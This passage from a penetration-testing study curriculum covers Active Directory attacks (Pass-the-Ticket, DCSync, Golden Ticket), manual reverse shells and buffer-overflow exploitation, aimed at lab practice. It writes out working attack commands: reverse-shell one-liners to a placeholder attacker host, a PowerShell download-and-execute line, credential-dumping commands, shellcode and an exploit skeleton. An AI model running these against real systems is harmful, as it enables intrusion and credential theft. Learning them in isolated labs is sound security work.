# Pass-the-Ticket
impacket-getTGT <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP>
export KRB5CCNAME=<USER>.ccache
impacket-psexec <DOMAIN>/<USER>@<TARGET> -k -no-pass

# DCSync (requires Domain Admin or specific ACL rights)
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC_IP>
impacket-secretsdump <DOMAIN>/<USER>@<DC_IP> -hashes :<NT_HASH>
# Extracts: NTDS.dit hashes (all domain users)

# Golden Ticket (requires krbtgt hash)
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> \
  -domain <DOMAIN> -user-id 500 Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec <DOMAIN>/Administrator@<DC> -k -no-pass

# ACL abuse: GenericWrite → force password reset
Set-ADAccountPassword -Identity <TARGET_USER> -NewPassword (ConvertTo-SecureString 'NewP@ss!' -AsPlainText -Force)

# Constrained/Unconstrained delegation
impacket-findDelegation <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP>

# NTDS.dit offline extraction (if you have the file)
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

### Key Commands
```bash
# Mimikatz equivalent (Linux): pypykatz
pypykatz lsa minidump lsass.dmp
pypykatz registry --system SYSTEM --sam SAM

# BloodHound attack paths
# In BloodHound cypher console:
# Find shortest path from owned to DA:
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p
```

**IppSec Reference:** Search "ippsec active directory lateral movement" or "ippsec dcsync" on YouTube

---

## Week 11 — Exploitation: Manual Reverse Shells & Exploit-DB Modification

### Theory
- Exploit-DB: https://www.exploit-db.com/ — searchsploit index
- PayloadsAllTheThings Reverse Shells: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
- GTFOBins shells: https://gtfobins.github.io/
- Metasploit-free exploitation: https://www.offensive-security.com/metasploit-unleashed/

### Action
**VulnHub Machines:**
- **Brainpan 1** — Windows buffer overflow, OSCP-classic
- **Kioptrix Level 3** — exploit chain from web to root

```bash
# searchsploit usage
searchsploit apache 2.4
searchsploit -x 47887          # examine exploit without copying
searchsploit -m 47887          # mirror exploit to current dir

# Manual reverse shells — no msfvenom
# Bash
bash -i >& /dev/tcp/<ATTACKER>/4444 0>&1
bash -c 'bash -i >& /dev/tcp/<ATTACKER>/4444 0>&1'

# Python3
python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("<ATTACKER>",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/bash","-i"])'

# Perl
perl -e 'use Socket;$i="<ATTACKER>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));STDIN->fdopen(S,r);STDOUT->fdopen(S,w);system$_ while<>;'

# PHP
php -r '$sock=fsockopen("<ATTACKER>",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

# PowerShell (Windows)
powershell -NoP -NonI -W Hidden -Exec Bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER>/rev.ps1')"

# TTY upgrade after catching shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then: Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows $(stty size | cut -d' ' -f1) columns $(stty size | cut -d' ' -f2)

# Netcat listener variants
nc -lvnp 4444
rlwrap nc -lvnp 4444    # readline wrapper (better history/arrow keys)

# Modifying public exploits
# 1. Copy exploit: searchsploit -m <EDB-ID>
# 2. Read carefully — adjust RHOST, LHOST, ports, offsets
# 3. Check for hardcoded paths, bad chars in shellcode
# 4. Recompile if needed: gcc -o exploit exploit.c
```

### Key Commands
```bash
# Generate shellcode manually (no msfvenom)
# x86 Linux execve /bin/sh shellcode (classic):
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80

# Windows reverse shell without Metasploit
# Use ncat (Nmap's netcat) or socat:
socat TCP:<ATTACKER>:4444 EXEC:'cmd.exe',pipes
```

**IppSec Reference:** Search "ippsec brainpan" or "ippsec exploit-db modification" on YouTube

---

## Week 12 — Exploitation: Buffer Overflow Fundamentals

### Theory
- Aleph One "Smashing the Stack for Fun and Profit" (free, Phrack #49): http://phrack.org/issues/49/14.html
- LiveOverflow Binary Exploitation playlist (free YouTube): https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN
- GDB PEDA/pwndbg repository: https://github.com/pwndbg/pwndbg
- x86 Assembly reference: https://www.cs.virginia.edu/~evans/cs216/guides/x86.html

### Action
**VulnHub Machines:**
- **Brainpan 1** — classic Windows stack buffer overflow (OSCP BoF style)
- **Exploit.Education Phoenix** — stack0 through stack6, format strings, heap

```bash
# === BUFFER OVERFLOW METHODOLOGY (OSCP-STYLE) ===

# Step 1: Crash the application
python3 -c "print('A' * 1000)" | nc <TARGET> <PORT>

# Step 2: Find exact offset with cyclic pattern
# Use pwntools cyclic (recommended):
python3 -c "from pwn import cyclic; print(cyclic(3000))"

# Step 3: Identify offset in GDB
gdb -q ./vulnerable_binary
(gdb) run $(python3 -c "from pwn import cyclic; print(cyclic(3000).decode())")
(gdb) info registers
# Find EIP value, then:
python3 -c "from pwn import cyclic_find; print(cyclic_find(<EIP_VALUE>))"

# Step 4: Control EIP
python3 -c "print('A'*<OFFSET> + 'B'*4 + 'C'*100)"

# Step 5: Find bad characters
# Generate full bad char array (\x00 is always bad, test \x01-\xff):
python3 -c "badchars = b''.join(bytes([i]) for i in range(1, 256)); print(badchars)"
# Send with payload and compare memory dump byte-by-byte in debugger

# Step 6: Find JMP ESP / return address
# In GDB/pwndbg:
(gdb) find /b 0x08048000,0x0804c000,0xff,0xe4    # search for JMP ESP opcode
# OR with pwndbg: rop --grep "jmp esp"
# OR: objdump -d ./vuln | grep -i "jmp.*esp\|call.*esp"

# Step 7: Generate shellcode
# Shellcode from shell-storm.org (free):
# https://shell-storm.org/shellcode/
# Copy raw bytes matching your target arch/OS

# Step 8: Final exploit
python3 exploit.py
# exploit.py structure:
# PADDING (A * offset) + JMP_ESP_ADDR (little-endian) + NOPsled + SHELLCODE

# Example exploit skeleton:
cat > /tmp/exploit.py << 'EOF'
import socket, struct

RHOST = "<TARGET>"
RPORT = <PORT>

offset   = <OFFSET>
jmp_esp  = struct.pack("<I", 0x<RETURN_ADDR>)  # little-endian
nopsled  = b"\x90" * 16
shellcode = b""  # paste shellcode bytes here

payload = b"A" * offset + jmp_esp + nopsled + shellcode

s = socket.socket()
s.connect((RHOST, RPORT))
s.send(payload)
s.close()
EOF
python3 /tmp/exploit.py
```

### Key Commands
```bash
# GDB with pwndbg — essential commands
gdb -q ./binary
(gdb) checksec                  # check security mitigations (NX, ASLR, stack canary)
(gdb) info functions            # list all functions
(gdb) disass main               # disassemble main
(gdb) b *main+<OFFSET>          # set breakpoint at address
(gdb) x/20wx $esp               # examine 20 words at ESP
(gdb) x/s <ADDR>                # examine string at address
(gdb) i r eip esp ebp           # inspect registers

# ASLR check on target system
cat /proc/sys/kernel/randomize_va_space     # 0=off, 1=partial, 2=full

# Disable ASLR for local testing
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

**IppSec Reference:** Search "ippsec brainpan buffer overflow" or "ippsec stack overflow" on YouTube

---

## Post-12-Week: Continuous Practice

### Wargames (100% Free, Online)
| Platform | Focus | URL |
|----------|-------|-----|
| OverTheWire: Bandit | Linux basics to advanced | https://overthewire.org/wargames/bandit/ |
| OverTheWire: Natas | Web exploitation | https://overthewire.org/wargames/natas/ |
| OverTheWire: Leviathan | SUID/binary exploitation | https://overthewire.org/wargames/leviathan/ |
| Exploit.Education | Binary exploitation | https://exploit.education/ |
| PicoCTF | Mixed CTF challenges | https://picoctf.org/ |
| SmashTheStack | Binary exploitation | http://smashthestack.org/ |
| Pwnable.kr | Binary exploitation | https://pwnable.kr/ |
| HackTheBox (free tier) | Full attack chains | https://www.hackthebox.eu/ |

### Essential Free References
| Resource | URL |
|----------|-----|
| HackTricks | https://book.hacktricks.xyz/ |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| GTFOBins | https://gtfobins.github.io/ |
| LOLBAS | https://lolbas-project.github.io/ |
| RevShells | https://www.revshells.com/ |
| CyberChef | https://gchq.github.io/CyberChef/ |
| ExplainShell | https://explainshell.com/ |
| Shell-Storm Shellcode DB | https://shell-storm.org/shellcode/ |
| IppSec (YouTube) | https://www.youtube.com/c/ippsec |
| LiveOverflow (YouTube) | https://www.youtube.com/c/LiveOverflow |

---

## Weekly Schedule Template

```
Mon: Theory (2h) — read documentation, study techniques
Tue: Lab Setup (1h) — configure VM, verify network isolation  
Wed: Active Exploitation (3h) — root the machine, no hints for 2h
Thu: Review (1h) — read IppSec walkthrough, compare methodology
Fri: Command Practice (1h) — re-run key commands from memory
Sat: PortSwigger Labs (2h) — web labs for web weeks, review otherwise
Sun: Notes & Writeup (1h) — document methodology, build personal wiki
```

---

## Operational Security Notes

> Practice in an **isolated local network only**. Never run these techniques against systems you do not own or have explicit written permission to test.

```bash
# Verify your attack VM is isolated
ip route
# Should only show your host-only adapter range (192.168.56.0/24)
# No default gateway to internet when attacking

# Snapshot VMs before each attack
VBoxManage snapshot <VM_NAME> take "pre-attack-$(date +%Y%m%d)"
```